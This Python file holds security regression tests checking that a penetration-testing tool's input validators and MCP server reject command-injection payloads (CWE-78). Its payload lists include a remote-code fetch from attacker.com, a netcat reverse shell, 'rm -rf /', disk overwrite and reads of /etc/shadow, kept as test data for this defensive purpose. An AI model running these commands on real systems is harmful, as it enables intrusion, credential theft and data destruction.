#!/usr/bin/env python3
"""
Security regression tests for the command-injection fix (CWE-78).

Runs with plain Python (no pytest required):
    python3 tests/test_security.py

Also works under pytest if installed:
    pytest tests/test_security.py

These tests verify two things:
  1. The input validator rejects shell metacharacters / injection payloads and
     accepts legitimate inputs.
  2. The MCP server builds argv LISTS (never shell strings) and refuses to place
     injected payloads into a command.
"""

import sys
import traceback
from pathlib import Path

# Make the project importable regardless of where this is run from
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from kali_gpt.utils.input_validator import validator, InputValidationError
from kali_gpt.tools import mcp_server


class _FakeConfig:
    """Minimal config manager stand-in for exercising integration modules."""

    def __init__(self, tmp_dir):
        self.config_dir = tmp_dir

    def get(self, key, default=None):
        return default


# Common injection payloads that must NEVER be accepted into a command
INJECTION_PAYLOADS = [
    "127.0.0.1; whoami",
    "127.0.0.1 && id",
    "127.0.0.1 | cat /etc/passwd",
    "127.0.0.1\n cat /etc/shadow",
    "$(curl http://attacker.com/x)",
    "`reboot`",
    "example.com; rm -rf /",
    "example.com & nc attacker 4444 -e /bin/sh",
    "10.0.0.1 > /dev/sda",
]


# ---------------------------------------------------------------------------
# Input validator: rejection of malicious input
# ---------------------------------------------------------------------------

def test_validate_target_rejects_injection():
    for payload in INJECTION_PAYLOADS:
        try:
            validator.validate_target(payload)
        except InputValidationError:
            continue
        raise AssertionError(f"validate_target accepted injection payload: {payload!r}")


def test_validate_domain_rejects_injection():
    for payload in ["example.com; whoami", "ex`id`ample.com", "a.com|b", "a.com$(id)"]:
        try:
            validator.validate_domain(payload)
        except InputValidationError:
            continue
        raise AssertionError(f"validate_domain accepted: {payload!r}")


def test_validate_port_range_rejects_injection():
    for payload in ["80; whoami", "22,$(id)", "1-100|cat", "80 443"]:
        try:
            validator.validate_port_range(payload)
        except InputValidationError:
            continue
        raise AssertionError(f"validate_port_range accepted: {payload!r}")


def test_validate_url_rejects_injection():
    for payload in ["http://a.com; rm -rf /", "notaurl", "ftp://a.com", "http://a`id`.com"]:
        try:
            validator.validate_url(payload)
        except InputValidationError:
            continue
        raise AssertionError(f"validate_url accepted: {payload!r}")


def test_wordlist_path_rejects_traversal():
    for payload in ["../../../etc/passwd", "/etc/passwd", "/tmp/evil;rm", "/usr/share/wordlists/../../etc/passwd"]:
        try:
            validator.validate_wordlist_path(payload)
        except InputValidationError:
            continue
        raise AssertionError(f"validate_wordlist_path accepted: {payload!r}")


def test_service_and_severity_allowlists():
    for bad in ["ssh; whoami", "telnet|x", "notaservice"]:
        try:
            validator.validate_service_name(bad)
        except InputValidationError:
            continue
        raise AssertionError(f"validate_service_name accepted: {bad!r}")
    for bad in ["critical; id", "ultra", "high|x"]:
        try:
            validator.validate_severity(bad)
        except InputValidationError:
            continue
        raise AssertionError(f"validate_severity accepted: {bad!r}")


# ---------------------------------------------------------------------------
# Input validator: acceptance of legitimate input
# ---------------------------------------------------------------------------

def test_validator_accepts_legitimate_input():
    assert validator.validate_target("192.168.1.1") == "192.168.1.1"
    assert validator.validate_target("10.0.0.0/24") == "10.0.0.0/24"
    assert validator.validate_target("example.com") == "example.com"
    assert validator.validate_domain("example.com") == "example.com"
    assert validator.validate_port_range("22,80,443") == "22,80,443"
    assert validator.validate_port_range("1-1000") == "1-1000"
    assert validator.validate_url("https://example.com") == "https://example.com"
    assert validator.validate_service_name("SSH") == "ssh"
    assert validator.validate_severity("High") == "high"


# ---------------------------------------------------------------------------
# MCP server: argv construction is safe
# ---------------------------------------------------------------------------

def test_build_command_returns_list_not_string():
    cmd = mcp_server._build_command("nmap_scan", {"target": "192.168.1.1", "scan_type": "quick"})
    assert isinstance(cmd, list), "command must be an argv list, not a shell string"
    assert cmd[0] == "nmap"
    assert "192.168.1.1" in cmd


def test_build_command_blocks_injection_in_target():
    for payload in INJECTION_PAYLOADS:
        try:
            mcp_server._build_command("nmap_scan", {"target": payload, "scan_type": "quick"})
        except InputValidationError:
            continue
        raise AssertionError(f"_build_command accepted injected target: {payload!r}")


def test_injected_payload_never_becomes_separate_argument():
    # Even where a value is allowed through, it must remain a SINGLE argv element,
    # so shell operators can never split it into a second command.
    cmd = mcp_server._build_command("searchsploit_search", {"query": "apache 2.4"})
    assert cmd[0] == "searchsploit"
    # "apache 2.4" splits into two plain terms, no shell operators present
    assert ";" not in cmd and "|" not in cmd
    try:
        mcp_server._build_command("searchsploit_search", {"query": "apache; rm -rf /"})
    except InputValidationError:
        pass
    else:
        raise AssertionError("searchsploit accepted a query containing ';'")


def test_execute_tool_reports_validation_error_not_execution():
    # execute_tool should return an error dict (not run anything) for bad input
    result = mcp_server.execute_tool("nmap_scan", {"target": "127.0.0.1; whoami"})
    assert "error" in result
    assert "validation" in result["error"].lower()


def test_unknown_tool_rejected():
    result = mcp_server.execute_tool("definitely_not_a_tool", {"target": "x"})
    assert "error" in result


# ---------------------------------------------------------------------------
# scanner.py: injected target is rejected before any tool runs
# ---------------------------------------------------------------------------

def test_scanner_rejects_injected_target():
    import tempfile
    from kali_gpt.integrations import scanner as scanner_mod

    tmp = tempfile.mkdtemp()
    sm = scanner_mod.ScannerManager(_FakeConfig(tmp), command_executor=None)
    # Pretend nmap exists so we reach validation; executor is None, so if the
    # method tried to execute it would crash — proving it must reject first.
    sm.is_tool_available = lambda name: True
    result = sm.nmap_scan("127.0.0.1; whoami", scan_type="quick")
    assert result["success"] is False
    assert "invalid target" in result["error"].lower()


def test_scanner_custom_scan_rejects_unknown_tool():
    import tempfile
    from kali_gpt.integrations import scanner as scanner_mod

    tmp = tempfile.mkdtemp()
    sm = scanner_mod.ScannerManager(_FakeConfig(tmp), command_executor=None)
    result = sm.run_custom_scan("evil_binary", "127.0.0.1", "")
    assert result["success"] is False
    assert "allowlist" in result["error"].lower()


# ---------------------------------------------------------------------------
# metasploit.py: injected values rejected before any tool runs
# ---------------------------------------------------------------------------

def test_metasploit_search_rejects_injection():
    from kali_gpt.integrations import metasploit as msf_mod

    m = msf_mod.MetasploitIntegration(_FakeConfig("/tmp"))
    m.is_available = lambda: True  # reach the validation path
    # ';' and '"' are not allowed by the search regex -> empty result, no exec
    assert m.search_exploits('eternalblue"; exit"; id #') == []


def test_metasploit_payload_rejects_bad_values():
    from kali_gpt.integrations import metasploit as msf_mod

    m = msf_mod.MetasploitIntegration(_FakeConfig("/tmp"))
    m.is_available = lambda: True
    # Injected LHOST must be rejected by validate_target
    result = m.generate_payload(
        "windows/meterpreter/reverse_tcp",
        lhost="10.0.0.1; rm -rf /",
        lport="4444",
    )
    assert result["success"] is False
    assert "validation" in result["error"].lower()


# ---------------------------------------------------------------------------
# exploit_engine.py: substituted values can't carry shell metacharacters
# ---------------------------------------------------------------------------

def test_exploit_engine_rejects_metachars():
    from kali_gpt import exploit_engine as ee

    for payload in INJECTION_PAYLOADS:
        try:
            ee._reject_shell_metachars(payload, "target")
        except ee.InputValidationError:
            continue
        raise AssertionError(f"_reject_shell_metachars accepted: {payload!r}")

    # a clean value passes through unchanged
    assert ee._reject_shell_metachars("192.168.1.10", "target") == "192.168.1.10"


# ---------------------------------------------------------------------------
# Minimal standalone runner (no pytest needed)
# ---------------------------------------------------------------------------

def _run():
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
    passed = failed = 0
    for t in tests:
        try:
            t()
            print(f"  PASS  {t.__name__}")
            passed += 1
        except Exception:
            print(f"  FAIL  {t.__name__}")
            traceback.print_exc()
            failed += 1
    print(f"\n{passed} passed, {failed} failed, {len(tests)} total")
    return failed == 0


if __name__ == "__main__":
    print("Running security regression tests (CWE-78 fix)\n")
    sys.exit(0 if _run() else 1)
